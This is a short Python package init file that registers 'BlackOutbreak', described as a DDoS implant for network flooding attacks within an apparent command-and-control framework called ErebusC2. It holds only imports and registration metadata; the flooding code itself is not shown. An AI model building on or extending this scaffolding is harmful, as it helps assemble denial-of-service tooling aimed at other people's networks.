"""
BlackOutbreak Module
Provides distributed denial of service capabilities for ErebusC2
"""
from .blackoutbreak_core import BlackOutbreak
from .blackoutbreak_handler import register_commands

# Module registration information
MODULE_INFO = {
    "name": "BlackOutbreak",
    "description": "DDoS implant for network flooding attacks",
    "version": "1.0.0",
    "author": "ErebusC2 Team",
    "category": "offensive",
    "capabilities": ["ddos", "network_flooding", "traffic_generation"],
    "commands": register_commands(),
    "template": "implants/blackoutbreak.html"
}

__version__ = "1.0.0"
